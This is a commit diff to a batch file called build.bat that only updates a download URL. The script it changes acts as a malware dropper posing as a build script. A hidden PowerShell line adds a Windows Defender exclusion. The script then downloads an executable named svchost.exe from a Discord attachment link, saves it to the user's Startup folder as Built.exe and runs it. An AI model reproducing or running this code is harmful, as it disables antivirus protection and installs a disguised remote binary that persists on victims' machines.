7f58ecdb11474a7e8240e1fe751415bba7ade16c
waltuhium23 <158318104+waltuhium23@users.noreply.github.com>
2024-03-01 19:40:37 +0300

    Update build.bat

--- build.bat
+++ build.bat
@@ -3,7 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1212759870869340180/svchost.exe?ex=65f301a5&is=65e08ca5&hm=3936d93316487270af48574a6e3b58769be08ce5e04c2be9a2b7e3868c2af124&"
+set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1213163605290262660/svchost.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -20,7 +20,7 @@ call "%DEST%"
 @echo off
 setlocal 
 
-set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1212759870869340180/svchost.exe?ex=65f301a5&is=65e08ca5&hm=3936d93316487270af48574a6e3b58769be08ce5e04c2be9a2b7e3868c2af124&"
+set "URL=https://cdn.discordapp.com/attachments/1206721383820820553/1213163605290262660/svchost.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
